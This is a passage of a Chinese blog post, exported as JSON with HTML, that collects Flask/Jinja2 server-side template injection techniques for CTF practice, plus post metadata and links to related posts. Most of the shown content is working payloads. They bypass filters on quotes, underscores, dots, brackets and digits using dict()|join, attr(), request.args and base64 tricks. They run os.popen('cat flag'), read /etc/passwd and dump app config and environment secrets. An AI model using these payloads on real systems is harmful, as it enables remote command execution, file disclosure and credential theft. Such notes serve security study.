字符，依次类推。</code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/ssti%E7%AC%94%E8%AE%B05.png\"><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/ssti%E7%AC%94%E8%AE%B06.png\"><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/ssti%E7%AC%94%E8%AE%B07.png\"><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/ssti%E7%AC%94%E8%AE%B08.png\"><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/ssti%E7%AC%94%E8%AE%B09.png\"></p>\n<h5 id=\"8-length过滤器绕过数字过滤\"><a href=\"#8-length过滤器绕过数字过滤\" class=\"headerlink\" title=\"8.length过滤器绕过数字过滤\"></a>8.length过滤器绕过数字过滤</h5><p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/ssti%E7%AC%94%E8%AE%B0app.py_2.png\"><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/ssti%E7%AC%94%E8%AE%B010.png\"><br><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/ssti%E7%AC%94%E8%AE%B011.png\"></p>\n<h5 id=\"9-获取config文件\"><a href=\"#9-获取config文件\" class=\"headerlink\" title=\"9.获取config文件\"></a>9.获取config文件</h5><p>有些flag可能在config文件中<br>如果没有过滤，直接{ {config} }就能打开。<br>&#x2F;&#x2F;姿势集里面有相关说明</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">**flask内置函数**\nlipsum 可加载第三方库\nurl_for 可返回url路径\n#url_for:一个可以根据视图函数名或端点名称生成相应 URL 的函数。通过这个函数，我们可以在不硬编码URL的情况下引用不同的视图函数或端点，并构建出正确的URL路由。\nget_flashed_message 可获取消息\n#get_flashed_messages：一个在重定向期间获取Flash消息的函数。Flash消息通常用于在请求之间存储临时信息，比如表单提交后显示一个成功或失败的消息。\n**flask内置对象**\ncycler：一个轻量级的循环迭代器，可以用于生成一系列重复的值。\njoiner：一个字符串连接器，可以将多个字符串连接成一个字符串。\nnamespace：一个命名空间对象，可以在程序中组织变量和函数，避免命名冲突。\nconfig：一个配置管理器对象，可以读取和写入程序的配置文件参数。\nrequest：一个用于发送 HTTP 请求的对象，通常用于从网络上获取数据。\nsession：一个用于存储用户会话信息的对象，通常用于在Web应用程序中跟踪用户状态。</code></pre>\n<p>可利用已加载内置函数或对象寻找被过滤字符串<br>可利用内置函数调用current_app模块进而查看配置文件</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">current_app\n调用current_app相当于调用flask\n&#123; &#123;url_for.__globals__[&#39;current_app&#39;].config&#125; &#125;\n#当在 Flask 模板中调用 &#123; &#123; url_for.__globals__[&#39;current_app&#39;].config &#125; &#125; 时，实际上是通过获取 url_for 对应的全局命名空间中的 current_app 对象，进而获取当前应用程序的配置信息并输出。\n&#123; &#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125; &#125;</code></pre>\n<h5 id=\"10-混合过滤\"><a href=\"#10-混合过滤\" class=\"headerlink\" title=\"10.混合过滤\"></a>10.混合过滤</h5><p>dict()和join</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">dict(): #用来创建一个字典\njoin： #将一个序列中的参数值拼接成字符串\n&#123; %set a&#x3D;dict(nihao&#x3D;1)% &#125;&#123; &#123;a&#125; &#125;   \n#创建字典a，键名nihao，键值1\n&#123; %set a&#x3D;dict(__cla&#x3D;1,ss__&#x3D;2)|join% &#125;&#123; &#123;a&#125; &#125;  \n#创建字典a，join把参数值拼接成字符串</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/all_picture/ssti%E7%AC%94%E8%AE%B0app.py_3.png\"><br>获取符号</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">利用flask内置函数和对象获取符号\n&#123; % set hao &#x3D; (&#123;&#125;|select()|string()) % &#125;&#123; &#123;hao&#125; &#125;\n&#123; % set hao &#x3D; (lipsum|string) % &#125;&#123; &#123;hao&#125; &#125;\n#获取下划线\n&#123; % set hao &#x3D; (self|string()) % &#125;&#123; &#123;hao&#125; &#125;\n#获取空格\n&#123; % set hao &#x3D; (self|string|urlencode) % &#125;&#123; &#123;hao&#125; &#125;\n#获取百分号\n&#123; % set hao &#x3D; (app.__doc__|string) % &#125;&#123; &#123;hao&#125; &#125;\n···类似的payload有很多\n在后面添加|list,然后根据返回的结果，通过hao[]去获取你需要的符号\n具体可以看示例2里面的payload</code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">示例1：WAF过滤  &#39;,&quot;,&#39;+&#39;,&#39;request&#39;,&#39;.&#39;,&#39;[&#39;,&#39;]&#39;\npayload原型:&#123; &#123;().__class__.__base__.__subclasses__()[117]&#125;.__init__.__globals__[&#39;popen&#39;](&#39;cat flag&#39;).read()&#125;\npayload：\n&#123; %set a&#x3D;dict(__class__&#x3D;1)|join% &#125;\n&#123; %set b&#x3D;dict(__base__&#x3D;1)|join% &#125;\n&#123; %set c&#x3D;dict(__subclasses__&#x3D;1)|join% &#125;\n&#123; %set d&#x3D;dict(__getitem__&#x3D;1)|join% &#125;\n&#123; %set e&#x3D;dict(__in&#x3D;1,it&#x3D;2)|join% &#125;\n&#123; %set f&#x3D;dict(__glo&#x3D;1,bals__&#x3D;2)|join% &#125;\n&#123; %set g&#x3D;dict(popen&#x3D;1)|join% &#125;\n&#123; %set kg&#x3D;&#123;&#125;|select()|string()|attr(d)(10)% &#125;     #空格\n&#123; %set i&#x3D;(dict(cat&#x3D;1)|join,kg,dict(flag&#x3D;2)|join)|join% &#125;\n&#123; %set r&#x3D;dict(read&#x3D;1)|join% &#125;\n&#123; &#123;()|attr(a)|attr(b)|attr(c)|attr(d)(117)|attr(e)|attr(f)|attr(d)(g)(i)|attr(r)()&#125; &#125;</code></pre>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">示例2：WAF过滤  &#39;,&quot;,&#39;_&#39;,&#39;0-9&#39;,&#39;.&#39;,&#39;[&#39;,&#39;]&#39;.&#39;\\&#39;,&#39;&#39;\npaylaod原型:&#123; &#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__item__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125; &#125;\npayload:\n&#123; %set nine&#x3D;dict(aaaaaaaaa&#x3D;a)|join|count% &#125;\n&#123; %set eighteen&#x3D;nine+nine% &#125;\n&#123; %set pop&#x3D;dict(pop&#x3D;a)|join% &#125;\n&#123; %set xhx&#x3D;(lipsum|string|list)|attr(pop)(eighteen)% &#125;\n&#123; %set kg&#x3D;(lipsum|string|list)|attr(pop)(nine)% &#125;\n#得到下划线xhx&#39;_&#39;和空格kg&#39; &#39;\n&#123; %set globals&#x3D;(xhx,xhx,dict(globals&#x3D;a)|join,xhx,xhx)|join% &#125;\n&#123; %set getitem&#x3D;(xhx,xhx,dict(getitem&#x3D;a)|join,xhx,xhx)|join% &#125;\n&#123; %set os&#x3D;dict(os&#x3D;a)|join% &#125;\n&#123; %set popen&#x3D;dict(popen&#x3D;a)|join% &#125;\n&#123; %set flag&#x3D;(dict(cat&#x3D;a)|join,kg,dict(flag&#x3D;a)|join)|join&#125;\n&#123; %set read&#x3D;dict(read&#x3D;a)|join&#125;\n&#123; &#123;lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(flag)|attr(read)()&#125; &#125;</code></pre>\n\n<h3 id=\"姿势集\"><a href=\"#姿势集\" class=\"headerlink\" title=\"姿势集\"></a>姿势集</h3><p>(来源<a href=\"https://zhuanlan.zhihu.com/p/93746437\">https://zhuanlan.zhihu.com/p/93746437</a>)</p>\n<h5 id=\"1-config-可以获取当前设置，如果题目是这样的：\"><a href=\"#1-config-可以获取当前设置，如果题目是这样的：\" class=\"headerlink\" title=\"1.{ {config} } 可以获取当前设置，如果题目是这样的：\"></a>1.{ {config} } 可以获取当前设置，如果题目是这样的：</h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">app.config [&#39;FLAG&#39;] &#x3D; os.environ.pop（&#39;FLAG&#39;）</code></pre>\n\n<p>可以直接访问 { {config[‘FLAG’]} } 或者 { {config.FLAG} } 得到 flag。</p>\n<h5 id=\"2-同样可以找到-config。\"><a href=\"#2-同样可以找到-config。\" class=\"headerlink\" title=\"2.同样可以找到 config。\"></a>2.同样可以找到 config。</h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123; &#123;self.__dict__._TemplateReference__context.config&#125; &#125;\n&#39;&#39;&#39;\n这段代码可以用于获取当前 Flask 应用程序上下文中的配置信息。\n&#96;self&#96; 表示模板上下文对象，&#96;__dict__&#96; 返回该对象储存的属性和值的字典，\n&#96;_TemplateReference__context&#96; 是表示调用上下文槽时使用的内部插槽名称。\n最终访问 &#96;config&#96; 属性可以得到应用程序的配置信息。\n&#39;&#39;&#39;</code></pre>\n\n<h5 id=\"3-环境变量\"><a href=\"#3-环境变量\" class=\"headerlink\" title=\"3.环境变量\"></a>3.环境变量</h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123; &#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&#39;os&#39;].__dict__[&#39;environ&#39;][&#39;FLAG&#39;]&#125; &#125;\n&#39;&#39;&#39;\n这段代码可以用于获取 Flask 程序中环境变量 &#96;&#39;FLAG&#39;&#96; 的值。\n首先创建一个空列表 &#96;[]&#96;，然后通过 &#96;. __class__&#96; 获取它的类 &#96;&lt;class &#39;list&#39;&gt;&#96;。\n再通过 &#96;.__base__&#96; 方法获取其基础类，即 &#96;&lt;class &#39;object&#39;&gt;&#96;。\n接着通过 &#96;.__subclasses__()&#96; 方法获取所有子类，得到一个列表。\n然后查询这个列表中下标为 &#96;68&#96; 的子类，得到 &#96;&lt;class &#39;posix.ScandirIterator&#39;&gt;&#96;。\n对该子类的 &#96;__init__&#96; 初始化函数进行取值并访问 &#96;__globals__[&#39;os&#39;].__dict__[&#39;environ&#39;][&#39;FLAG&#39;]&#96; \n就可以获取环境变量 &#96;&#39;FLAG&#39;&#96; 的值。\n&#39;&#39;&#39;</code></pre>\n\n<h5 id=\"4-url-for、g、request、namespace、lipsum、range、session、dict、get-flashed-messages、cycler、joiner、config等\"><a href=\"#4-url-for、g、request、namespace、lipsum、range、session、dict、get-flashed-messages、cycler、joiner、config等\" class=\"headerlink\" title=\"4.url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config等\"></a>4.url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config等</h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">这是 Flask 中一些常用的对象或方法：\n&#39;&#39;&#39;\n- &#96;url_for&#96;：生成 URL。\n- &#96;g&#96;：应用程序上下文中存储数据的齿轮。在请求之间共享数据。\n- &#96;request&#96;：表示客户端发出的请求。\n- &#96;namespace&#96;：命名空间，常常用于优化 url_for。\n- &#96;lipsum&#96;：快速生成 Lorem Ipsum 文本。\n- &#96;range&#96;：Python 内置函数，用于生成一个固定区间内的整数序列。\n- &#96;session&#96;：应用程序上下文中用户会话存储数据的地方。在请求之间共享数据。\n- &#96;dict&#96;：Python 内置类型，字典类型，用于保存键-值对。\n- &#96;get_flashed_messages&#96;：从请求中弹出闪现消息。\n- &#96;cycler&#96;：Matplotlib 库中的循环器，用于对颜色、线条风格等元素进行迭代访问。\n- &#96;joiner&#96;：用于拼接字符串。\n- &#96;config&#96;：Flask 应用程序全局配置。\n&#39;&#39;&#39;</code></pre>\n\n<p>如果上面提到的 config、self 不能使用，要获取配置信息，就必须从它的全局变量（访问配置 current_app 等）。例如：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123; &#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n#url_for.__globals__[&#39;current_app&#39;]，表示获取当前应用程序实例中的全局变量；\n#然后通过 config.FLAG 获取环境变量 FLAG 的值。\n&#123; &#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n#get_flashed_messages.__globals__[&#39;current_app&#39;]，同样表示获取当前应用程序实例中的全局变量；\n#然后再次通过 config.FLAG 获取环境变量 FLAG 的值。\n#该函数主要用于传递闪现消息给用户，而在这里被“利用”以获取环境变量。\n&#123; &#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125; &#125;\n#在获取到 request 对象和 current_app 对象后，使用 _get_data_for_json() 方法将请求数据编码为 json 格式，\n#并使用 json 库进行编码。由于 flask 使用了自定义的 JSONEncoder 类，\n#所以我们通过 json.JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;] 来访问环境变量。</code></pre>\n\n<h6 id=\"5-过滤了-、\"><a href=\"#5-过滤了-、\" class=\"headerlink\" title=\"5.过滤了 []、.\"></a>5.过滤了 []、.</h6><p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()</code></pre>\n\n<p>在这里使用 pop 函数并不会真的移除，但却能返回其值，取代中括号来实现绕过。</p>\n<p>若.也被过滤，使用原生 JinJa2 函数 |attr()</p>\n<p>即将 <code>request.__class__</code> 改成 <code>request|attr(&quot;__class__&quot;)</code></p>\n<h5 id=\"6-过滤下划线\"><a href=\"#6-过滤下划线\" class=\"headerlink\" title=\"6.过滤下划线 _\"></a>6.过滤下划线 _</h5><p>利用 <code>request.args</code> 的属性</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">\n&#123; &#123; &#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125; &#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__</code></pre>\n\n<p>将其中的 <code>request.args</code> 改为 <code>request.values</code>，则利用 post 的方式进行传参。</p>\n<p>GET:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">\n&#123; &#123; &#39;&#39;[request.value.class][request.value.mro][2][request.value.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125; &#125;</code></pre>\n\n<p>POST:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__</code></pre>\n\n<h5 id=\"7-过滤引号-“\"><a href=\"#7-过滤引号-“\" class=\"headerlink\" title=\"7.过滤引号 “\"></a>7.过滤引号 “</h5><p><code>request.args</code> 是 flask 中的一个属性，为返回请求的参数，这里把 path 当作变量名，将后面的路径传值进来，进而绕过了引号的过滤。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123; &#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125; &#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd</code></pre>\n\n<h5 id=\"8-一些关键字被过滤。\"><a href=\"#8-一些关键字被过滤。\" class=\"headerlink\" title=\"8.一些关键字被过滤。\"></a>8.一些关键字被过滤。</h5><p>base64编码绕过<br>用于<code>__getattribute__</code>使用实例访问属性时。</p>\n<p>例如，过滤掉 <code>__class__</code> 关键词</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123; &#123;[].__getattribute__(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;)).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125; &#125;</code></pre>\n\n<p>字符串拼接绕过</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123; &#123;[].__getattribute__(&#39;__c&#39;+&#39;lass__&#39;).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125; &#125;\n&#123; &#123;[].__getattribute__([&#39;__c&#39;,&#39;lass__&#39;]|join).__base__.__subclasses__()[40]&#125; &#125; </code></pre>","feature":true,"text":"ssti模板注入flask漏洞-代码不严谨可能造成任意文件读取和RCE远程控制控制后台系统 漏洞成因：~~ 渲染模板时，没有严格控制对用户的输入~~ 使用了危险的模板，导致用户可以和flask程序进行交互 flask是基于python开发的一种web框架，那么也就意味着如果用户可...","link":"","photos":[],"count_time":{"symbolsCount":"26k","symbolsTime":"23 mins."},"categories":[{"name":"文章","slug":"文章","count":7,"path":"api/categories/文章.json"}],"tags":[{"name":"ssti模板注入","slug":"ssti模板注入","count":2,"path":"api/tags/ssti模板注入.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">ssti模板注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%EF%BC%9A\"><span class=\"toc-text\">漏洞成因：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A4%E6%96%AD%E6%A8%A1%E6%9D%BF%E7%B1%BB%E5%9E%8B\"><span class=\"toc-text\">判断模板类型</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ssti%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%A8%A1%E6%9D%BF\"><span class=\"toc-text\">ssti常用注入模板</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96\"><span class=\"toc-text\">1.文件读取</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0eval%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">2.内建函数eval执行命令</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-os%E6%A8%A1%E5%9D%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">3.os模块执行命令</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-importlib%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">4.importlib类执行命令</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5-linecache%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">5.linecache函数执行命令</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#6-subprocess-Popen%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">6.subprocess.Popen类执行命令</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">总结</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">绕过过滤</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%8F%8C%E5%A4%A7%E6%8B%AC%E5%8F%B7\"><span class=\"toc-text\">1.绕过过滤双大括号</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E6%97%A0%E5%9B%9E%E6%98%BEssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">2.无回显ssti模板注入</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-getitem%E7%BB%95%E8%BF%87%E4%B8%AD%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">3.getitem绕过中括号过滤</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-request%E7%BB%95%E8%BF%87%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">4.request绕过单双引号过滤</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5-%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BB%95%E8%BF%87%E4%B8%8B%E5%88%92%E7%BA%BF%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">5.过滤器绕过下划线过滤</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#6-%E4%B8%AD%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87%E7%82%B9%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">6.中括号绕过点过滤</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#7-%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">7.绕过关键字过滤</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#8-length%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BB%95%E8%BF%87%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">8.length过滤器绕过数字过滤</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#9-%E8%8E%B7%E5%8F%96config%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">9.获取config文件</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#10-%E6%B7%B7%E5%90%88%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">10.混合过滤</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A7%BF%E5%8A%BF%E9%9B%86\"><span class=\"toc-text\">姿势集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-config-%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E8%AE%BE%E7%BD%AE%EF%BC%8C%E5%A6%82%E6%9E%9C%E9%A2%98%E7%9B%AE%E6%98%AF%E8%BF%99%E6%A0%B7%E7%9A%84%EF%BC%9A\"><span class=\"toc-text\">1.{ {config} } 可以获取当前设置，如果题目是这样的：</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E5%90%8C%E6%A0%B7%E5%8F%AF%E4%BB%A5%E6%89%BE%E5%88%B0-config%E3%80%82\"><span class=\"toc-text\">2.同样可以找到 config。</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F\"><span class=\"toc-text\">3.环境变量</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-url-for%E3%80%81g%E3%80%81request%E3%80%81namespace%E3%80%81lipsum%E3%80%81range%E3%80%81session%E3%80%81dict%E3%80%81get-flashed-messages%E3%80%81cycler%E3%80%81joiner%E3%80%81config%E7%AD%89\"><span class=\"toc-text\">4.url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config等</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#5-%E8%BF%87%E6%BB%A4%E4%BA%86-%E3%80%81\"><span class=\"toc-text\">5.过滤了 []、.</span></a></li></ol></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#6-%E8%BF%87%E6%BB%A4%E4%B8%8B%E5%88%92%E7%BA%BF\"><span class=\"toc-text\">6.过滤下划线 _</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#7-%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7-%E2%80%9C\"><span class=\"toc-text\">7.过滤引号 “</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#8-%E4%B8%80%E4%BA%9B%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4%E3%80%82\"><span class=\"toc-text\">8.一些关键字被过滤。</span></a></li></ol></li></ol></li></ol></li></ol>","author":{"name":"南瓜の无名","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/picture/head.jpg","link":"/","description":"你不需要很厉害才能开始，但你需要开始才能变得很厉害！","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"web[LitCTF2023] 郑州轻工业大学首届网络安全赛wp","uid":"a1d695094e9aa3c3a7c4f837b1ce6fd6","slug":"Litctf 2023","date":"2023-05-16T15:45:17.000Z","updated":"2023-05-18T16:01:57.100Z","comments":true,"path":"api/articles/Litctf 2023.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/picture/5.jpg","text":"1.我Flag呢？ 2.导弹迷踪 3.Follow me and hack me 4.Ping前端验证绕过，我们输入127.0.0.1，符合前端验证的格式就行，然后点击ping按钮，尝试用burpsuite抓包,（当然，你也可以选择禁用js来解决）并将抓到的包进行我们需要的修改，...","link":"","photos":[],"count_time":{"symbolsCount":"3.2k","symbolsTime":"3 mins."},"categories":[{"name":"文章","slug":"文章","count":7,"path":"api/categories/文章.json"}],"tags":[{"name":"LitCTF","slug":"LitCTF","count":1,"path":"api/tags/LitCTF.json"},{"name":"wp","slug":"wp","count":1,"path":"api/tags/wp.json"}],"author":{"name":"南瓜の无名","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/picture/head.jpg","link":"/","description":"你不需要很厉害才能开始，但你需要开始才能变得很厉害！","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"ssti模板注入学习笔记-flask前置知识","uid":"1e1792beaab2c135cf1beec290eff7af","slug":"flask_study","date":"2023-04-14T10:49:36.000Z","updated":"2023-05-10T11:44:14.126Z","comments":true,"path":"api/articles/flask_study.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/picture/1.jpg","text":"flask是一个使用python编写的轻量级web应用框架 python可以直接用flask启动一个web服务页面 cd &#x2F;opt&#x2F;flask1 source .&#x2F;bin&#x2F;activate cd &#x2F;root vim demo.py...","link":"","photos":[],"count_time":{"symbolsCount":"5.6k","symbolsTime":"5 mins."},"categories":[{"name":"文章","slug":"文章","count":7,"path":"api/categories/文章.json"}],"tags":[{"name":"ssti模板注入","slug":"ssti模板注入","count":2,"path":"api/tags/ssti模板注入.json"}],"author":{"name":"南瓜の无名","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/picture/head.jpg","link":"/","description":"你不需要很厉害才能开始，但你需要开始才能变得很厉害！","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}